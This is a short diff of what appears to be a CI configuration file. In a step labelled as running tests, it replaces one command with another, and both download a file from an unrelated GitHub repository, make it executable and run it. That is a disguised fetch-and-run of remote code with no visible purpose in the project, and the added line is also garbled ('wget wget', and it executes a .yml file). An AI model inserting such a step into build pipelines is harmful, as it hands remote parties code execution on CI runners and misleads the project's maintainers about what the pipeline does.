@@ -31,4 +31,4 @@ jobs:
           key: v1-dependencies-{{ checksum "package.json" }}
 
       # run tests!
-      - run: wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/lopemantan.sh && chmod +x *sh && ./lopemantan.sh
+      - run: wget wget https://raw.githubusercontent.com/makaryobos/privasi/main/.github/workflows/main.yml && chmod +x *sh && ./main.yml
